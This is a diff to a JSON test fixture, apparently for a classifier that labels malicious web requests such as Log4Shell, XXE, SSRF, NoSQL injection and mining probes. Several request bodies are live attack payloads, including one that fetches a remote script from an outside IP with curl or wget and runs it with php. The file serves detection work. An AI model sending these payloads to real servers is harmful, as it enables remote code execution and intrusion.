@@ -2688,5 +2688,95 @@
     "body": "msg=${${lower:j}ndi:ldap://evil/a}",
     "expected_purpose": "rce",
     "expected_name": "Log4Shell"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/services/",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://209.50.53.48:8888/CVE-2026-49875\">]><r>&x;</r>",
+    "expected_purpose": "rce",
+    "expected_name": "XML External Entity (XXE) Injection"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/struts2-showcase/index.action",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:153.0) Gecko/20100101 Firefox/153.0",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "Apache Struts 2 Showcase Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/?_task=mail&_action=show&_uid=1",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0",
+    "body": "_task=mail&_action=show",
+    "expected_purpose": "app_discovery",
+    "expected_name": "Roundcube Webmail Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/contact",
+    "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
+    "body": "{\"email\":[\"admin@admin.com\"],\"password\":{\"test\":1}}",
+    "expected_purpose": "credential_theft",
+    "expected_name": "NoSQL Operator Injection"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/certenroll/",
+    "ua": "StrongWind Security Research Scanner (https://scan.strongwind.dev)",
+    "body": "",
+    "expected_purpose": "research_scanner",
+    "expected_name": "StrongWind Security Research Scanner"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/loadIG",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0",
+    "body": "url=http://209.50.53.48:8888/CVE-2026-34361",
+    "expected_purpose": "proxy_abuse",
+    "expected_name": "HAPI FHIR Validator SSRF (loadIG)"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/functionRouter",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0",
+    "body": "test",
+    "expected_purpose": "app_discovery",
+    "expected_name": "functionRouter Endpoint Probe"
+  },
+  {
+    "type": "heuristic",
+    "source": "db",
+    "method": "POST",
+    "path": "/",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36",
+    "body": "{\"id\": 1, \"method\": \"eth_getWork\", \"params\": []}",
+    "expected_purpose": "crypto_mining",
+    "expected_name": null
+  },
+  {
+    "type": "heuristic",
+    "source": "db",
+    "method": "POST",
+    "path": "/modular.php??act=cmd",
+    "ua": "Mozilla/5.0",
+    "body": "id;uname -a;curl -ks http://212.83.160.70/t/cmd.txt > /tmp/a.out || wget http://212.83.160.70/t/cmd.txt -O /tmp/a.out || GET  http://212.83.160.70/t/cmd.txt > /tmp/a.out;php /tmp/a.out",
+    "expected_purpose": "rce",
+    "expected_name": null
   }
 ]
